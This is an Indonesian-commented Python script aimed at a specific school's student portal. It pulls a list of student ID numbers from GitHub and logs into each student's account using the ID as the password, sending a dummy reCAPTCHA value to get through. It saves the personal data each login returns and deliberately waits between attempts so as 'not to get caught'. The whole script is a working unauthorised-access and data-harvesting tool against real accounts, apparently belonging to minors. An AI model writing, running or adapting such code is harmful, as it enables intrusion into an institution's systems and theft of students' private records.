import requests
import json
import os
import time
from datetime import datetime
from bs4 import BeautifulSoup
import sys

# Konfigurasi
BASE_URL = "https://siatex-v2.smktexmaco-smg.sch.id"
LOGIN_URL = f"{BASE_URL}/login-public"
DOWNLOAD_DIR = os.path.expanduser("~/storage/downloads/DaftarNis")

# Warna ANSI
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    color = {
        "INFO": CYAN,
        "SUKSES": GREEN,
        "GAGAL": RED,
        "WARNING": YELLOW,
        "PROSES": MAGENTA,
        "SELESAI": BLUE
    }
    print(f"{color.get(level, WHITE)}[{timestamp}] [{level}] {msg}{RESET}")

def input_link():
    log("Masukkan link GitHub (file JSON daftar NIS):", "INFO")
    link = input(f"{CYAN}Link > {RESET}").strip()
    if not link:
        log("Link kosong, pakai link default.", "WARNING")
        link = "https://github.com/taufiq876/DataNis/blob/main/Data/List_Nis_Siatex.json"
    # Ubah link blob jadi raw
    if "/blob/" in link:
        link = link.replace("/blob/", "/raw/")
    log(f"Menggunakan link: {link}", "INFO")
    return link

def ambil_daftar_nis(link):
    log("Mengambil daftar NIS dari link...", "PROSES")
    try:
        resp = requests.get(link)
        resp.raise_for_status()
        data = resp.json()
        siswa_list = data["siswa"]
        log(f"Berhasil ambil {len(siswa_list)} data siswa", "SUKSES")
        return siswa_list
    except Exception as e:
        log(f"Gagal ambil daftar NIS: {e}", "GAGAL")
        return []

def login_siswa(nis):
    log(f"Login dengan NIS {nis}...", "PROSES")
    try:
        # Buat session baru setiap login
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"
        })

        # Ambil halaman login untuk CSRF token
        resp = session.get(BASE_URL)
        soup = BeautifulSoup(resp.text, "html.parser")
        csrf = soup.find("input", {"name": "_token"})
        if not csrf:
            log(f"CSRF token tidak ditemukan untuk NIS {nis}. Coba lagi...", "GAGAL")
            return None
        csrf_token = csrf["value"]

        # Data login
        data = {
            "_token": csrf_token,
            "username": nis,
            "password": nis,
            "status_login": "siswa",
            "g-recaptcha-response": "dummy"
        }

        # Kirim login
        resp = session.post(LOGIN_URL, data=data, allow_redirects=False)

        # Cek response
        if resp.status_code == 200:
            try:
                json_data = resp.json()
                if json_data.get("status") == True:
                    log(f"Login SUKSES untuk NIS {nis}", "SUKSES")
                    return json_data
                else:
                    log(f"Login GAGAL untuk NIS {nis}: {json_data.get('message', 'Unknown')}", "GAGAL")
                    return None
            except Exception as e:
                log(f"Response bukan JSON untuk NIS {nis}: {e}", "GAGAL")
                return None
        else:
            log(f"HTTP error {resp.status_code} untuk NIS {nis}", "GAGAL")
            return None
    except Exception as e:
        log(f"Error saat login NIS {nis}: {e}", "GAGAL")
        return None

def clean_json(obj):
    if isinstance(obj, list):
        return [clean_json(i) for i in obj if i not in (None, "", [], {})]
    if isinstance(obj, dict):
        return {k: clean_json(v) for k, v in obj.items() if v not in (None, "", [], {})}
    return obj

def simpan_json(nis, data):
    try:
        os.makedirs(DOWNLOAD_DIR, exist_ok=True)
        filepath = os.path.join(DOWNLOAD_DIR, f"{nis}.json")
        with open(filepath, "w") as f:
            json.dump(clean_json(data), f, indent=2)
        log(f"Data NIS {nis} tersimpan di {filepath}", "SUKSES")
    except Exception as e:
        log(f"Gagal simpan NIS {nis}: {e}", "GAGAL")

def progress_bar(current, total, bar_length=40):
    percent = current / total * 100
    filled = int(bar_length * current / total)
    bar = "=" * filled + "-" * (bar_length - filled)
    print(f"\r{GREEN}{BOLD}[{bar}] {WHITE}{current}/{total} ({percent:.1f}%){RESET}", end="")

def main():
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
    link = input_link()
    siswa_list = ambil_daftar_nis(link)
    if not siswa_list:
        log("Tidak ada data siswa. Keluar.", "GAGAL")
        return

    total = len(siswa_list)
    sukses = 0
    gagal = 0
    # Ambil file yang sudah ada untuk resume
    existing_files = set(os.listdir(DOWNLOAD_DIR)) if os.path.exists(DOWNLOAD_DIR) else set()
    # Filter NIS yang belum ada filenya
    belum_download = [s for s in siswa_list if f"{s['nis']}.json" not in existing_files]

    log(f"Total siswa: {total}", "INFO")
    log(f"Folder penyimpanan: {DOWNLOAD_DIR}", "INFO")
    log(f"Sudah ada: {total - len(belum_download)} file, akan diproses: {len(belum_download)}", "INFO")
    log("Mulai proses...", "SELESAI")

    for idx, siswa in enumerate(belum_download, start=1):
        nis = siswa["nis"]
        nama = siswa["nama"]
        log(f"({idx}/{len(belum_download)}) Memproses: {nis} - {nama}", "PROSES")

        # Login
        result = login_siswa(nis)
        if result:
            simpan_json(nis, result)
            sukses += 1
        else:
            gagal += 1

        # Delay biar gak ketahuan
        time.sleep(5)
        progress_bar(idx, len(belum_download))

    log(f"\nSelesai! Sukses: {sukses}, Gagal: {gagal}", "SELESAI")

if __name__ == "__main__":
    main()
